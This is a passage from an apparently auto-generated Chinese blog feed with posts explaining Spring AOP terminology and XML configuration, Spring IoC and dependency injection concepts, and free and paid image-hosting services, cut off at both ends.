链接点(Joinpoint)"></a>* (1) 链接点(Joinpoint)</h3><p>程序执行的某个特定位置：如类开始初始化前、类初始化后、类某个方法调用前、调用后、方法抛出异常后。一个类或一段程序代码拥有一些具有边界性质的特定点，这些点中的特定点就称为“连接点”。Spring仅支持方法的连接点，即仅能在方法调用前、方法调用后、方法抛出异常时以及方法调用前后这些程序执行点织入增强。（可以被切入的点）</p><h3 id="2-切点-Pointcut"><a href="#2-切点-Pointcut" class="headerlink" title="* (2) 切点(Pointcut)"></a>* (2) 切点(Pointcut)</h3><p>每个程序类都拥有多个连接点，如一个拥有两个方法的类，这两个方法都是连接点，即连接点是程序类中客观存在的事物。AOP通过“切点”定位特定的连接点。连接点相当于数据库中的记录，而切点相当于查询条件。切点和连接点不是一对一的关系，一个切点可以匹配多个连接点。在Spring中，切点通过org.springframework.aop.Pointcut接口进行描述，它使用类和方法作为连接点的查询条件，Spring AOP的规则解析引擎负责切点所设定的查询条件，找到对应的连接点。其实确切地说，不能称之为查询连接点，因为连接点是方法执行前、执行后等包括方位信息的具体程序执行点，而切点只定位到某个方法上，所以如果希望定位到具体连接点上，还需要提供方位信息。（已经被切入的点）</p><h3 id="3-通知-增强-Advice"><a href="#3-通知-增强-Advice" class="headerlink" title="* (3) 通知/增强(Advice)"></a>* (3) 通知/增强(Advice)</h3><p>增强是织入到目标类连接点上的一段程序代码，在Spring中，增强除用于描述一段程序代码外，还拥有另一个和连接点相关的信息，这便是执行点的方位。结合执行点方位信息和切点信息，我们就可以找到特定的连接点。（在切入点添加通过，增强它的功能）</p><h3 id="4-目标对象-Target"><a href="#4-目标对象-Target" class="headerlink" title="* (4) 目标对象(Target)"></a>* (4) 目标对象(Target)</h3><p>增强逻辑的织入目标类。如果没有AOP，目标业务类需要自己实现所有逻辑，而在AOP的帮助下，目标业务类只实现那些非横切逻辑的程序逻辑，而性能监视和事务管理等这些横切逻辑则可以使用AOP动态织入到特定的连接点上。（代理的目标对象）</p><h3 id="5-引介-Introduction"><a href="#5-引介-Introduction" class="headerlink" title="* (5) 引介(Introduction)"></a>* (5) 引介(Introduction)</h3><p>引介是一种特殊的增强，它为类添加一些属性和方法。这样，即使一个业务类原本没有实现某个接口，通过AOP的引介功能，我们可以动态地为该业务类添加接口的实现逻辑，让业务类成为这个接口的实现类。 （理解一种特殊的通知）</p><h3 id="6-织入-Weaving"><a href="#6-织入-Weaving" class="headerlink" title="* (6) 织入(Weaving)"></a>* (6) 织入(Weaving)</h3><p>织入是将增强添加对目标类具体连接点上的过程。AOP像一台织布机，将目标类、增强或引介通过AOP这台织布机天衣无缝地编织到一起。根据不同的实现技术，AOP有三种织入的方式：<br>a、编译期织入，这要求使用特殊的Java编译器。<br>b、类装载期织入，这要求使用特殊的类装载器。<br>c、动态代理织入，在运行期为目标类添加增强生成子类的方式。<br>Spring采用动态代理织入，而AspectJ采用编译期织入和类装载期织入。（通知放到切入点）</p><h3 id="7-代理-Proxy"><a href="#7-代理-Proxy" class="headerlink" title="* (7) 代理(Proxy)"></a>* (7) 代理(Proxy)</h3><p>一个类被AOP织入增强后，就产出了一个结果类，它是融合了原类和增强逻辑的代理类。根据不同的代理方式，代理类既可能是和原类具有相同接口的类，也可能就是原类的子类，所以我们可以采用调用原类相同的方式调用代理类。</p><h3 id="8-切面-Aspect"><a href="#8-切面-Aspect" class="headerlink" title="* (8) 切面(Aspect)"></a>* (8) 切面(Aspect)</h3><p>切面由切点和增强（引介）组成，它既包括了横切逻辑的定义，也包括了连接点的定义，Spring AOP就是负责实施切面的框架，它将切面所定义的横切逻辑织入到切面所指定的连接点中。（是切入点和通知的结合）</p><h2 id="AOP相关概念定义："><a href="#AOP相关概念定义：" class="headerlink" title="AOP相关概念定义："></a>AOP相关概念定义：</h2><ul><li><strong>Aspect（切面）</strong>： Aspect 声明类似于 Java 中的类声明，在 Aspect 中会包含着一些 Pointcut 以及相应的 Advice。</li><li><strong>Joint point（连接点）</strong>：表示在程序中明确定义的点，典型的包括方法调用，对类成员的访问以及异常处理程序块的执行等等，它自身还可以嵌套其它 joint point。</li><li><strong>Pointcut（切点）</strong>：表示一组 joint point，这些 joint point 或是通过逻辑关系组合起来，或是通过通配、正则表达式等方式集中起来，它定义了相应的 Advice 将要发生的地方。</li><li><strong>Advice（增强）</strong>：Advice 定义了在 Pointcut 里面定义的程序点具体要做的操作，它通过 before、after 和 around 来区别是在每个 joint point 之前、之后还是代替执行的代码。</li><li><strong>Target（目标对象）</strong>：织入 Advice 的目标对象.。</li><li><strong>Weaving（织入）</strong>：将 Aspect 和其他对象连接起来, 并创建 Adviced object 的过程</li></ul><h2 id="四、AOP其他知识点"><a href="#四、AOP其他知识点" class="headerlink" title="四、AOP其他知识点"></a>四、AOP其他知识点</h2><h3 id="1、通配符使用"><a href="#1、通配符使用" class="headerlink" title="1、通配符使用"></a>1、通配符使用</h3><p>在配置文件的切入点定义中，可以使用通配符*，该通配符可以表示返回值、类的全类名、方法名<br>如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;aop:pointcut expression=<span class="string">&quot;execution(* *.*())&quot;</span> id=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><h3 id="2、后置通知"><a href="#2、后置通知" class="headerlink" title="2、后置通知"></a>2、后置通知</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;aop:config&gt;</span><br><span class="line">   &lt;!-- 定义切入点（切入单个方法） --&gt;</span><br><span class="line">        &lt;aop:pointcut expression=<span class="string">&quot;execution(* *.update())&quot;</span> id=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br><span class="line">   &lt;!-- 定义切面，引用通知类 --&gt;</span><br><span class="line">   &lt;aop:aspect ref=<span class="string">&quot;transactionAdvice&quot;</span>&gt;</span><br><span class="line">      &lt;!-- method=<span class="string">&quot;before&quot;</span> 通知类型   pointcut=<span class="string">&quot;pointcut&quot;</span>  选择切入点 --&gt;</span><br><span class="line">     &lt;aop:after method=<span class="string">&quot;after&quot;</span> pointcut-ref=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br><span class="line">   &lt;/aop:aspect&gt;</span><br><span class="line">&lt;/aop:config&gt;</span><br></pre></td></tr></table></figure><h3 id="3、环绕通知"><a href="#3、环绕通知" class="headerlink" title="3、环绕通知"></a>3、环绕通知</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;aop:config&gt;</span><br><span class="line">   &lt;!-- 定义切入点（切入所有方法） --&gt;</span><br><span class="line">        &lt;aop:pointcut expression=<span class="string">&quot;execution(* *.*())&quot;</span> id=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br><span class="line">   &lt;!-- 定义切面，引用通知类 --&gt;</span><br><span class="line">   &lt;aop:aspect ref=<span class="string">&quot;transactionAdvice&quot;</span>&gt;</span><br><span class="line">      &lt;!-- method=<span class="string">&quot;before&quot;</span> 通知类型   pointcut=<span class="string">&quot;pointcut&quot;</span>  选择切入点 --&gt;</span><br><span class="line">     &lt;aop:around method=<span class="string">&quot;around&quot;</span> pointcut-ref=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br><span class="line">   &lt;/aop:aspect&gt;</span><br><span class="line">&lt;/aop:config&gt;</span><br></pre></td></tr></table></figure><h3 id="4、异常通知"><a href="#4、异常通知" class="headerlink" title="4、异常通知"></a>4、异常通知</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">(String n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">9</span>/<span class="number">0</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;***保存数据***&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;aop:after-returning method=<span class="string">&quot;afterReturning&quot;</span> pointcut-ref=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br><span class="line">&lt;aop:after-throwing method=<span class="string">&quot;afterException&quot;</span> pointcut-ref=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><h3 id="5、通知汇总"><a href="#5、通知汇总" class="headerlink" title="5、通知汇总"></a>5、通知汇总</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">xmlns:p=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span><br><span class="line">xmlns:context=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="line">xmlns:aop=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span><br><span class="line">xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string"> http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="line"><span class="string">http://www.springframework.org/schema/context </span></span><br><span class="line"><span class="string">http://www.springframework.org/schema/context/spring-context.xsd</span></span><br><span class="line"><span class="string">http://www.springframework.org/schema/aop </span></span><br><span class="line"><span class="string">http://www.springframework.org/schema/aop/spring-aop-4.3.xsd&quot;</span>&gt;</span><br><span class="line">&lt;!--  Spring AOP实现方式有两种，一种使用JDK动态代理，</span><br><span class="line">另一种通过CGLIB来为目标对象创建代理。如果被代理的目标实现了至少一个接口，</span><br><span class="line">则会使用JDK动态代理，所有该目标类型实现的接口都将被代理。 --&gt;</span><br><span class="line">&lt;aop:aspectj-autoproxy proxy-target-<span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">&lt;!-- 目标对象 --&gt;</span><br><span class="line">&lt;bean id=<span class="string">&quot;userService&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ahbvc.spring.aop.service.UserServiceImpl&quot;</span>&gt;&lt;/bean&gt;</span><br><span class="line">&lt;!-- 通知类/增强类 --&gt;</span><br><span class="line">&lt;bean id=<span class="string">&quot;transactionAdvice&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ahbvc.spring.aop.advice.TransactionAdvice&quot;</span>&gt;&lt;/bean&gt;</span><br><span class="line">&lt;!-- 将通知织入到目标对象，即开始面向切面编程 --&gt;</span><br><span class="line">&lt;aop:config&gt;</span><br><span class="line">   &lt;!-- 定义切入点 --&gt;</span><br><span class="line">        &lt;aop:pointcut expression=<span class="string">&quot;execution(* *.save(..))&quot;</span> id=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br><span class="line">   &lt;!-- 定义切面，引用通知类 --&gt;</span><br><span class="line">   &lt;aop:aspect ref=<span class="string">&quot;transactionAdvice&quot;</span>&gt;</span><br><span class="line">      &lt;!-- method=<span class="string">&quot;before&quot;</span> 通知类型   pointcut=<span class="string">&quot;pointcut&quot;</span>  选择切入点 --&gt;</span><br><span class="line">      &lt;aop:before method=<span class="string">&quot;before&quot;</span> pointcut-ref=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br><span class="line">      &lt;aop:after method=<span class="string">&quot;after&quot;</span> pointcut-ref=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br><span class="line">      &lt;aop:after-returning method=<span class="string">&quot;afterReturning&quot;</span> pointcut-ref=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br><span class="line">     &lt;aop:around method=<span class="string">&quot;around&quot;</span> pointcut-ref=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br><span class="line">     &lt;aop:after-throwing method=<span class="string">&quot;afterException&quot;</span> pointcut-ref=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br><span class="line">   &lt;/aop:aspect&gt;</span><br><span class="line">&lt;/aop:config&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><h3 id="6、方法带参数"><a href="#6、方法带参数" class="headerlink" title="6、方法带参数"></a>6、方法带参数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;aop:pointcut expression=<span class="string">&quot;execution(* *.*(..))&quot;</span> id=<span class="string">&quot;pointcut&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><h3 id="7、spring官方文档定义"><a href="#7、spring官方文档定义" class="headerlink" title="7、spring官方文档定义"></a>7、spring官方文档定义</h3><p><img src="https://s2.loli.net/2021/12/26/9iXyrGh3xID6S1n.png" alt="19.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、Spring是什么？&quot;&gt;&lt;a href=&quot;#一、Spring是什么？&quot; class=&quot;headerlink&quot; title=&quot;一、Spring是什么？&quot;&gt;&lt;/a&gt;一、Spring是什么？&lt;/h1&gt;&lt;p&gt;Spring是一个轻量级的2EE框架。它是一个容器框架，用来</summary>
      
    
    
    
    
    <category term="笔记" scheme="http://zhizhi111.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Spring" scheme="http://zhizhi111.github.io/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Spring中IoC和DI的理解</title>
    <link href="http://zhizhi111.github.io/2021/12/24/IoC%E5%92%8CDI%E7%9A%84%E7%90%86%E8%A7%A3-%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82/"/>
    <id>http://zhizhi111.github.io/2021/12/24/IoC%E5%92%8CDI%E7%9A%84%E7%90%86%E8%A7%A3-%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82/</id>
    <published>2021-12-24T12:28:46.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>tips:<br> 学习过Spring框架的人一定都会听过Spring的IoC(控制反转) 、DI(依赖注入)这两个概念，对于初学Spring的人来说，总觉得IoC 、DI这两个概念是模糊不清的，是很难理解的，今天和大家分享网上的一些技术大牛们对Spring框架的IOC的理解以及谈谈我对Spring Ioc的理解。</p></blockquote><h1 id="一、分享Iteye的开涛对IoC的精彩讲解"><a href="#一、分享Iteye的开涛对IoC的精彩讲解" class="headerlink" title="一、分享Iteye的开涛对IoC的精彩讲解"></a>一、分享Iteye的开涛对IoC的精彩讲解</h1><h2 id="1-1、IoC是什么"><a href="#1-1、IoC是什么" class="headerlink" title="1.1、IoC是什么"></a>1.1、IoC是什么</h2><p>　　IoC—Inversion of Control，即“控制反转”，不是什么技术，而是一种设计思想。在Java开发中，Ioc意味着将你设计好的对象交给容器控制，而不是传统的在你的对象内部直接控制。如何理解好Ioc呢？理解好Ioc的关键是要明确“谁控制谁，控制什么，为何是反转（有反转就应该有正转了），哪些方面反转了”，那我们来深入分析一下：</p><p>　　●谁控制谁，控制什么：传统Java SE程序设计，我们直接在对象内部通过new进行创建对象，是程序主动去创建依赖对象；而IoC是有专门一个容器来创建这些对象，即由Ioc容器来控制对 象的创建；谁控制谁？当然是IoC 容器控制了对象；控制什么？那就是主要控制了外部资源获取（不只是对象包括比如文件等）。</p><p>　　●为何是反转，哪些方面反转了：有反转就有正转，传统应用程序是由我们自己在对象中主动控制去直接获取依赖对象，也就是正转；而反转则是由容器来帮忙创建及注入依赖对象；为何是反转？因为由容器帮我们查找及注入依赖对象，对象只是被动的接受依赖对象，所以是反转；哪些方面反转了？依赖对象的获取被反转了。</p><h2 id="1-2、IoC能做什么"><a href="#1-2、IoC能做什么" class="headerlink" title="1.2、IoC能做什么"></a>1.2、IoC能做什么</h2><p>　　IoC 不是一种技术，只是一种思想，一个重要的面向对象编程的法则，它能指导我们如何设计出松耦合、更优良的程序。传统应用程序都是由我们在类内部主动创建依赖对象，从而导致类与类之间高耦合，难于测试；有了IoC容器后，把创建和查找依赖对象的控制权交给了容器，由容器进行注入组合对象，所以对象与对象之间是 松散耦合，这样也方便测试，利于功能复用，更重要的是使得程序的整个体系结构变得非常灵活。</p><p>　　其实IoC对编程带来的最大改变不是从代码上，而是从思想上，发生了“主从换位”的变化。应用程序原本是老大，要获取什么资源都是主动出击，但是在IoC/DI思想中，应用程序就变成被动的了，被动的等待IoC容器来创建并注入它所需要的资源了。</p><p>　　IoC很好的体现了面向对象设计法则之一—— 好莱坞法则：“别找我们，我们找你”；即由IoC容器帮对象找相应的依赖对象并注入，而不是由对象主动去找。</p><h2 id="1-3、IoC和DI"><a href="#1-3、IoC和DI" class="headerlink" title="1.3、IoC和DI"></a>1.3、IoC和DI</h2><p>　　DI—Dependency Injection，即“依赖注入”：组件之间依赖关系由容器在运行期决定，形象的说，即由容器动态的将某个依赖关系注入到组件之中。依赖注入的目的并非为软件系统带来更多功能，而是为了提升组件重用的频率，并为系统搭建一个灵活、可扩展的平台。通过依赖注入机制，我们只需要通过简单的配置，而无需任何代码就可指定目标需要的资源，完成自身的业务逻辑，而不需要关心具体的资源来自何处，由谁实现。</p><p>　　理解DI的关键是：“谁依赖谁，为什么需要依赖，谁注入谁，注入了什么”，那我们来深入分析一下：</p><p>　　●谁依赖于谁：当然是应用程序依赖于IoC容器；</p><p>　　●为什么需要依赖：应用程序需要IoC容器来提供对象需要的外部资源；</p><p>　　●谁注入谁：很明显是IoC容器注入应用程序某个对象，应用程序依赖的对象；</p><p>　　●注入了什么：就是注入某个对象所需要的外部资源（包括对象、资源、常量数据）。</p><p>　　IoC和DI由什么关系呢？其实它们是同一个概念的不同角度描述，由于控制反转概念比较含糊（可能只是理解为容器控制对象这一个层面，很难让人想到谁来维护对象关系），所以2004年大师级人物Martin Fowler又给出了一个新的名字：“依赖注入”，相对IoC 而言，“依赖注入”明确描述了“被注入对象依赖IoC容器配置依赖对象”。</p><p>　　看过很多对Spring的Ioc理解的文章，好多人对Ioc和DI的解释都晦涩难懂，反正就是一种说不清，道不明的感觉，读完之后依然是一头雾水，感觉就是开涛这位技术牛人写得特别通俗易懂，他清楚地解释了IoC(控制反转) 和DI(依赖注入)中的每一个字，读完之后给人一种豁然开朗的感觉。我相信对于初学Spring框架的人对Ioc的理解应该是有很大帮助的。</p><h1 id="二、分享Bromon的blog上对IoC与DI浅显易懂的讲解"><a href="#二、分享Bromon的blog上对IoC与DI浅显易懂的讲解" class="headerlink" title="二、分享Bromon的blog上对IoC与DI浅显易懂的讲解"></a>二、分享Bromon的blog上对IoC与DI浅显易懂的讲解</h1><h2 id="2-1、IoC-控制反转"><a href="#2-1、IoC-控制反转" class="headerlink" title="2.1、IoC(控制反转)"></a>2.1、IoC(控制反转)</h2><p>　　首先想说说IoC（Inversion of Control，控制反转）。这是spring的核心，贯穿始终。所谓IoC，对于spring框架来说，就是由spring来负责控制对象的生命周期和对象间的关系。这是什么意思呢，举个简单的例子，我们是如何找女朋友的？常见的情况是，我们到处去看哪里有长得漂亮身材又好的mm，然后打听她们的兴趣爱好、qq号、电话号、ip号、iq号………，想办法认识她们，投其所好送其所要，然后嘿嘿……这个过程是复杂深奥的，我们必须自己设计和面对每个环节。传统的程序开发也是如此，在一个对象中，如果要使用另外的对象，就必须得到它（自己new一个，或者从JNDI中查询一个），使用完之后还要将对象销毁（比如Connection等），对象始终会和其他的接口或类藕合起来。</p><p>　　那么IoC是如何做的呢？有点像通过婚介找女朋友，在我和女朋友之间引入了一个第三者：婚姻介绍所。婚介管理了很多男男女女的资料，我可以向婚介提出一个列表，告诉它我想找个什么样的女朋友，比如长得像李嘉欣，身材像林熙雷，唱歌像周杰伦，速度像卡洛斯，技术像齐达内之类的，然后婚介就会按照我们的要求，提供一个mm，我们只需要去和她谈恋爱、结婚就行了。简单明了，如果婚介给我们的人选不符合要求，我们就会抛出异常。整个过程不再由我自己控制，而是有婚介这样一个类似容器的机构来控制。Spring所倡导的开发方式就是如此，所有的类都会在spring容器中登记，告诉spring你是个什么东西，你需要什么东西，然后spring会在系统运行到适当的时候，把你要的东西主动给你，同时也把你交给其他需要你的东西。所有的类的创建、销毁都由 spring来控制，也就是说控制对象生存周期的不再是引用它的对象，而是spring。对于某个具体的对象而言，以前是它控制其他对象，现在是所有对象都被spring控制，所以这叫控制反转。</p><h2 id="2-2、DI-依赖注入"><a href="#2-2、DI-依赖注入" class="headerlink" title="2.2、DI(依赖注入)"></a>2.2、DI(依赖注入)</h2><p>　　IoC的一个重点是在系统运行中，动态的向某个对象提供它所需要的其他对象。这一点是通过DI（Dependency Injection，依赖注入）来实现的。比如对象A需要操作数据库，以前我们总是要在A中自己编写代码来获得一个Connection对象，有了 spring我们就只需要告诉spring，A中需要一个Connection，至于这个Connection怎么构造，何时构造，A不需要知道。在系统运行时，spring会在适当的时候制造一个Connection，然后像打针一样，注射到A当中，这样就完成了对各个对象之间关系的控制。A需要依赖 Connection才能正常运行，而这个Connection是由spring注入到A中的，依赖注入的名字就这么来的。那么DI是如何实现的呢？ Java 1.3之后一个重要特征是反射（reflection），它允许程序在运行的时候动态的生成对象、执行对象的方法、改变对象的属性，spring就是通过反射来实现注入的。</p><p>　　理解了IoC和DI的概念后，一切都将变得简单明了，剩下的工作只是在spring的框架中堆积木而已。</p><h1 id="三、我对IoC-控制反转-和DI-依赖注入-的理解"><a href="#三、我对IoC-控制反转-和DI-依赖注入-的理解" class="headerlink" title="三、我对IoC(控制反转)和DI(依赖注入)的理解"></a>三、我对IoC(控制反转)和DI(依赖注入)的理解</h1><p>　　在平时的java应用开发中，我们要实现某一个功能或者说是完成某个业务逻辑时至少需要两个或以上的对象来协作完成，在没有使用Spring的时候，每个对象在需要使用他的合作对象时，自己均要使用像new object() 这样的语法来将合作对象创建出来，这个合作对象是由自己主动创建出来的，创建合作对象的主动权在自己手上，自己需要哪个合作对象，就主动去创建，创建合作对象的主动权和创建时机是由自己把控的，而这样就会使得对象间的耦合度高了，A对象需要使用合作对象B来共同完成一件事，A要使用B，那么A就对B产生了依赖，也就是A和B之间存在一种耦合关系，并且是紧密耦合在一起，而使用了Spring之后就不一样了，创建合作对象B的工作是由Spring来做的，Spring创建好B对象，然后存储到一个容器里面，当A对象需要使用B对象时，Spring就从存放对象的那个容器里面取出A要使用的那个B对象，然后交给A对象使用，至于Spring是如何创建那个对象，以及什么时候创建好对象的，A对象不需要关心这些细节问题(你是什么时候生的，怎么生出来的我可不关心，能帮我干活就行)，A得到Spring给我们的对象之后，两个人一起协作完成要完成的工作即可。</p><p>　　所以控制反转IoC(Inversion of Control)是说创建对象的控制权进行转移，以前创建对象的主动权和创建时机是由自己把控的，而现在这种权力转移到第三方，比如转移交给了IoC容器，它就是一个专门用来创建对象的工厂，你要什么对象，它就给你什么对象，有了 IoC容器，依赖关系就变了，原先的依赖关系就没了，它们都依赖IoC容器了，通过IoC容器来建立它们之间的关系。</p><h1 id="四、结尾"><a href="#四、结尾" class="headerlink" title="四、结尾"></a>四、结尾</h1><p>　　对于Spring Ioc这个核心概念，我相信每一个学习Spring的人都会有自己的理解。这种概念上的理解没有绝对的标准答案，仁者见仁智者见智。如果有理解不到位或者理解错的地方，欢迎指正！</p><h2 id="最后，感谢阅读！"><a href="#最后，感谢阅读！" class="headerlink" title="最后，感谢阅读！"></a>最后，感谢阅读！</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;tips:&lt;br&gt; 学习过Spring框架的人一定都会听过Spring的IoC(控制反转) 、DI(依赖注入)这两个概念，对于初学Spring的人来说，总觉得IoC 、DI这两个概念是模糊不清的，是很难理解的，今天和大家分享网上的一些技术大牛们对S</summary>
      
    
    
    
    
    <category term="笔记" scheme="http://zhizhi111.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Spring" scheme="http://zhizhi111.github.io/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>本站使用的图床以及图床推荐</title>
    <link href="http://zhizhi111.github.io/2021/12/23/%E6%9C%AC%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BA%8A-%E8%AE%B0%E5%BD%95/"/>
    <id>http://zhizhi111.github.io/2021/12/23/%E6%9C%AC%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BA%8A-%E8%AE%B0%E5%BD%95/</id>
    <published>2021-12-23T01:39:52.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>tips：<br>通常情况我们在建网站或者日常上网的时候用到图床的理由就是以下几种情况：<br>临时分享图片到其他网站外链；<br>自己服务器硬盘不够用；<br>自己服务器带宽小，网速慢；<br>不想把图片放到自己服务器；<br>自己没有服务器但是又想分享图片。<br>图床是指存储图片的服务器，就是专门用来存放图片的服务器，更多的是指提供图片外链的服务，有免费图床，也有付费图床。</p></blockquote><h2 id="一、目前使用的图床-SM-MS"><a href="#一、目前使用的图床-SM-MS" class="headerlink" title="一、目前使用的图床(SM.MS)"></a>一、目前使用的图床(SM.MS)</h2><p>我是使用markdown来写博客，可是markdown的图片却是本地的，如果我要发博客到GitHub上，那么就不行了，GitHub上是不能存图片的。于是干脆弄了个图床，本地截图的时候上传到图床，markdown中的代码结果也是图床里的，这样就解决了这个问题了。引入图片不需要引入图片的所在文件夹的相对地址，不再将使用到的图片放到项目的img文件夹中，直接引入图片在互联网的图片即可，加载速度也快，很方便。</p><p>之前写了两篇博客<code>MySQL中常见约束(笔记)</code>跟<code>Navicat注册机破解教学</code>,图片也是引入的互联网地址，我事先将图片发布到C站，然后将C站的网络地址复制粘贴，引入到我的文章里去，这样也是很方便的，C站就相当于一个图床，但是这样引入的图片，有我C站的水印，没办法，它在C站发布自带水印，就这点看着不舒服，我就想在网上找找其他图床。</p><p>下面就是我配置文件部分引入图片的截图，最上面的一个引入是相对地址引入，我能在img文件夹找到这个图片，另外都是互联网地址引入，比较方便，不用把图片存到项目里。<br><img src="https://s2.loli.net/2021/12/23/F1PdAeMuDn6vOBb.png" alt="2"></p><p>使用图床你必须要考虑的是（尤其免费图床）图床稳定性和安全性如何，会不会出现某一天突然不能使用的情况，那时候你是否可以快速恢复网站文章和页面使用的图片。</p><p>推荐一款免费的图床网站，使用起来很方便，<a href="https://sm.ms/">SM.MS</a>,免费且方便。<br>使用图床服务，可以节约你网站的服务器硬盘使用和带宽使用，好的图床可以加快你网站访问速度。</p><p>百度上一搜，也能搜出来很多图床网站，只要你去发现，就不用担心没图床可以用，你只需要担心的是万一某一天图床突然不能用了你怎么恢复网站上的图片。<br>也可以考虑使用免费的CDN或者云存储服务（其实付费也不贵，不要相信永久免费。</p><h2 id="二、推荐图床"><a href="#二、推荐图床" class="headerlink" title="二、推荐图床"></a>二、推荐图床</h2><h3 id="1-购买OSS服务在阿里云上买！。"><a href="#1-购买OSS服务在阿里云上买！。" class="headerlink" title="1. 购买OSS服务在阿里云上买！。"></a>1. 购买OSS服务<a href="https://www.aliyun.com/product/oss/">在阿里云上买！</a>。</h3><h3 id="2-七牛云-注册就送云存储空间，白嫖云存储，hxd冲呀。"><a href="#2-七牛云-注册就送云存储空间，白嫖云存储，hxd冲呀。" class="headerlink" title="2. [七牛云]注册就送云存储空间，白嫖云存储，hxd冲呀。"></a>2. [七牛云]注册就送云存储空间，白嫖云存储，hxd冲呀。</h3><h3 id="3-路过图床-这家图床是因为它拥有无限空间，无限流量，并且成立于2011年，至今已经有9年的历史了，感觉跑路的概率相对较低"><a href="#3-路过图床-这家图床是因为它拥有无限空间，无限流量，并且成立于2011年，至今已经有9年的历史了，感觉跑路的概率相对较低" class="headerlink" title="3. 路过图床,这家图床是因为它拥有无限空间，无限流量，并且成立于2011年，至今已经有9年的历史了，感觉跑路的概率相对较低"></a>3. <a href="https://imgtu.com/">路过图床</a>,这家图床是因为它拥有无限空间，无限流量，并且成立于2011年，至今已经有9年的历史了，感觉跑路的概率相对较低</h3><h3 id="4-聚合图床"><a href="#4-聚合图床" class="headerlink" title="4. 聚合图床"></a>4. <a href="https://www.superbed.cn/">聚合图床</a></h3><p>优点:有技术人员支持，图片访问速度稳定，跑路概率相对较低<br>缺点:收费，免费用户可以存储的图片数量太少了</p><h3 id="5-公益图床-免费，免费，免费，白嫖HXD。"><a href="#5-公益图床-免费，免费，免费，白嫖HXD。" class="headerlink" title="5. 公益图床,免费，免费，免费，白嫖HXD。"></a>5. <a 